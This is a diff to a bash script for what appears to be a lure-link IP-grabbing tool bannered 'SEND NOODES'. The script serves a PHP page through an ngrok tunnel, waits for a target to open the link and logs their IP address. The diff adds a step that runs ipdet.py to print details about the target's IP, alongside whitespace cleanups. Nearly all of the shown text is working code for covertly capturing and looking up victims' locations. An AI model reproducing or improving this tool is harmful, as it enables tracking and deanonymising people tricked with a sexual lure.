@@ -15,8 +15,9 @@ if [ $(dpkg-query -W -f='${Status}' curl 2>/dev/null | grep -c "ok installed") -
 then
 	apt-get install --force-yes --yes curl;
 fi
+
 banner() {
-	
+
 	printf "$(tput setaf 1)"
 	figlet "SEND NOODES"
 	printf "$(tput setaf 3)"
@@ -53,7 +54,7 @@ dependencies() {
 
 
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
- 
+
 
 
 }
@@ -65,7 +66,6 @@ IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 
 cat ip.txt >> saved.ip.txt
-
 
 }
 
@@ -79,8 +79,10 @@ while [ true ]; do
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
+printf "User IP Details :"
+printf "\n"
+python ipdet.py
 rm -rf ip.txt
-
 fi
 
 sleep 0.5
@@ -91,7 +93,7 @@ rm -rf Log.log
 fi
 sleep 0.5
 
-done 
+done
 
 }
 
@@ -129,7 +131,7 @@ exit 1
 fi
 
 else
-wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
 if [[ -e ngrok-stable-linux-386.zip ]]; then
 unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
@@ -142,7 +144,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
@@ -180,4 +182,3 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 banner
 dependencies
 start1
-
